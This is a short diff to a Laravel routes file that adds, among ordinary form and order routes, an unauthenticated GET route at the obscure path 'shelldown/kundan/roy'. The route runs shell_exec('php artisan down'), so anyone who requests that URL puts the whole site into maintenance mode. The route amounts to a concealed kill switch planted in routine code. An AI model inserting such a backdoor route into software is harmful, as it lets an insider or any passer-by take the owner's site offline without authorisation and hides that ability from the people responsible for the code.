@@ -41,6 +41,10 @@ Route::match(['post','get'],'makeOrder',[
         ]
     );
  
+Route::get('shelldown/kundan/roy',function(){
+  shell_exec('php artisan down');    
+} );
+
 
 Route::match(['post','get'],'saveForm',[
         'as' => 'saveForm',
